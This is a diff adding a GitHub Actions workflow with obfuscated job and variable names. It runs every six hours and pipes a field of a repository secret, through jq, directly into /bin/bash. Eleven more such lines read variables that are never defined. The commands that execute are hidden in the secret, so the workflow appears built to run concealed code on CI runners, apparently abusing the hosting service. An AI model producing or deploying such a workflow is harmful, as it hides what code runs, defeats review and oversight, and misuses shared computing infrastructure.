@@ -1,0 +1,29 @@
+name: xiangdangyu6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangdangyu6715
+        env:
+          mapl26: ${{ secrets.mapl26 }}
+        run: |
+          echo $mapl26 | jq -r .gr117 | /bin/bash
+          echo $r953 | jq -r .bqjg3 | /bin/bash
+          echo $c19692 | jq -r .uyx3 | /bin/bash
+          echo $cv465 | jq -r .tvudq2710 | /bin/bash
+          echo $kh04 | jq -r .rjh31976 | /bin/bash
+          echo $onc76 | jq -r .phr47 | /bin/bash
+          echo $fppbq646 | jq -r .jo1 | /bin/bash
+          echo $yl47 | jq -r .xk6402 | /bin/bash
+          echo $c9589 | jq -r .kktp50356 | /bin/bash
+          echo $jyqok4683 | jq -r .rtgq723 | /bin/bash
+          echo $a72956 | jq -r .bscvy08 | /bin/bash
+          echo $s80857 | jq -r .hay447 | /bin/bash
+
